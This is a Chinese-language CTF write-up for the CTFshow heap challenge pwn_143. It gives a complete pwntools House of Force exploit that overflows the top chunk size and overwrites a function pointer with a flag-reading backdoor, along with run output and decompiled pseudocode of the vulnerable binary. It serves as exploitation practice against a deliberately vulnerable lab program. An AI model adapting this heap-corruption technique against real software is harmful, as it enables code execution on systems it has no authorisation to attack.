# CTFshow-pwn_143
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 堆利用（fastbin-堆溢出）
## 解题思路
> House of Force

仅没有 PIE 保护，本地libc使用 2.23-0ubuntu11.3_amd64
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so ./pwn_143
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64 ./pwn_143
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_143
[*] '/home/mrw/CTFshow/pwn_143'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64'
    Stripped:   No
```

- 程序支持 chunk 的增删查改且能够申请任意长度堆块以及任意长度堆溢出（edit时无长度检查），同时程序未开启 PIE 且提供了直接获取 flag 的函数
- 可以利用 House of Force （若控制 top chunk 指向低地址那么和整数溢出也算有点关系）修改 top chunk 地址，从而重新申请存储着函数指针的 chunk，覆盖 goodbye_message 函数指针为后门函数的地址即可

**exp 如下**  
```python
from pwn import *
p = process('./pwn_143')
gdb.attach(p)
# 与程序沟通
def add(siz, content):
  p.sendafter(b'Your choice:', b'2')
  p.sendafter(b'length:', str(siz).encode())
  p.sendafter(b'name:', content)

def edit(index, siz, content):
  p.sendafter(b'Your choice:', b'3')
  p.sendafter(b'index:', str(index).encode())
  p.sendafter(b'the length of name:', str(siz).encode())
  p.sendafter(b'the new name:', content)

def delete(index):
  p.sendafter(b'Your choice:', b'4')
  p.sendafter(b'index:', str(index).encode())

def show():
  p.sendafter(b'Your choice:', b'1')

def finish():
  p.sendafter(b'Your choice:', b'5')

# 堆溢出修改 top chunk 的 size 为 -1（0xffffffffffffffff）
add(0x50, b'a')
edit(0, 0x60, b'a'*0x50 + p64(0) + b'\xff\xff\xff\xff\xff\xff\xff\xff')

# 重新申请到原有的 chunk 并修改函数指针
add(-0x90, b'') # 修改 top chunk 位置
add(0x10, 2*p64(0x400d7f)) # 修改函数指针

# 执行后门
finish()
p.interactive()
```
> 有关第一个 chunk 的申请还存在一些疑惑之处，测试发现若第一次申请0x10或0x20则脚本必然在第二次申请时 malloc 失败返回空地址  
> 但若是0x20~0x70则可以正常利用

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ vim ./exp/pwn_143.py
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_143.py
[+] Starting local process './pwn_143': pid 18557
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn_143', '-p', '18557']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
[*] Process './pwn_143' stopped with exit code 0 (pid 18557)
fake{hajimionanbeiluduo}
\xff\xff\xff\xff\xff\xff\xff\x90\x98\xa3\x05[*] Got EOF while reading in interactive
```

## 反编译后伪代码中有用的部分

反编译得到的有用的伪代码如下  
```c

void __noreturn fffffffffffffffffffffffffffffffffflag()
{
  int fd; // [rsp+Ch] [rbp-74h]
  char buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v2; // [rsp+78h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  fd = open("/flag", 0);
  read(fd, buf, 0x64uLL);
  close(fd);
  printf("%s", buf);
  exit(0);
}
int show()
{
  int i; // [rsp+Ch] [rbp-4h]

  if ( !num )
    return puts("No");
  for ( i = 0; i <= 99; ++i )
  {
    if ( *((_QWORD *)&unk_6020A8 + 2 * i) )
      printf("%d : %s", (unsigned int)i, *((const char **)&unk_6020A8 + 2 * i));
  }
  return puts(&byte_401137);
}
__int64 add()
{
  int i; // [rsp+4h] [rbp-1Ch]
  int v2; // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( num > 99 )
  {
    puts("Full");
  }
  else
  {
    printf("Please enter the length:");
    read(0, buf, 8uLL);
    v2 = atoi(buf);
    if ( !v2 )
    {
      puts("Invaild length");
      return 0LL;
    }
    for ( i = 0; i <= 99; ++i )
    {
      if ( !*((_QWORD *)&unk_6020A8 + 2 * i) )
      {
        *((_DWORD *)&list + 4 * i) = v2;
        *((_QWORD *)&unk_6020A8 + 2 * i) = malloc(v2);
        printf("Please enter the name:");
        *(_BYTE *)(*((_QWORD *)&unk_6020A8 + 2 * i) + (int)read(0, *((void **)&unk_6020A8 + 2 * i), v2)) = 0;
        ++num;
        return 0LL;
      }
    }
  }
  return 0LL;
}
unsigned __int64 edit()
{
  int v1; // [rsp+Ch] [rbp-24h]
  int v2; // [rsp+10h] [rbp-20h]
  char buf[8]; // [rsp+18h] [rbp-18h] BYREF
  char nptr[8]; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020A8 + 2 * v1) )
    {
      printf("Please enter the length of name:");
      read(0, nptr, 8uLL);
      v2 = atoi(nptr);
      printf("Please enter the new name:");
      *(_BYTE *)(*((_QWORD *)&unk_6020A8 + 2 * v1) + (int)read(0, *((void **)&unk_6020A8 + 2 * v1), v2)) = 0;
    }
    else
    {
      puts("Invaild index");
    }
  }
  else
  {
    puts("Nothing here~");
  }
  return __readfsqword(0x28u) ^ v5;
}
unsigned __int64 delete()
{
  int v1; // [rsp+Ch] [rbp-14h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( num )
  {
    printf("Please enter the index:");
    read(0, buf, 8uLL);
    v1 = atoi(buf);
    if ( *((_QWORD *)&unk_6020A8 + 2 * v1) )
    {
      free(*((void **)&unk_6020A8 + 2 * v1));
      *((_QWORD *)&unk_6020A8 + 2 * v1) = 0LL;
      *((_DWORD *)&list + 4 * v1) = 0;
      puts("free successful!!");
      --num;
    }
    else
    {
      puts("invaild index");
    }
  }
  else
  {
    puts("No");
  }
  return __readfsqword(0x28u) ^ v3;
}
int menu()
{
  puts("----------------------------");
  puts("       CTFshow Menu         ");
  puts("----------------------------");
  puts("1.show");
  puts("2.add");
  puts("3.edit");
  puts("4.delete");
  puts("5.exit");
  puts("----------------------------");
  return printf("Your choice:");
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void (**v4)(void); // [rsp+8h] [rbp-18h]
  char buf[8]; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(argc, argv, envp);
  logo();
  v4 = (void (**)(void))malloc(0x10uLL);
  *v4 = (void (*)(void))hello_message;
  v4[1] = (void (*)(void))goodbye_message;
  (*v4)();
  while ( 1 )
  {
    menu();
    read(0, buf, 8uLL);
    switch ( atoi(buf) )
    {
      case 1:
        show();
        break;
      case 2:
        add();
        break;
      case 3:
        edit();
        break;
      case 4:
        delete();
        break;
      case 5:
        v4[1]();
        exit(0);
      default:
        puts("Invaild choice!!!");
        break;
    }
  }
}
```
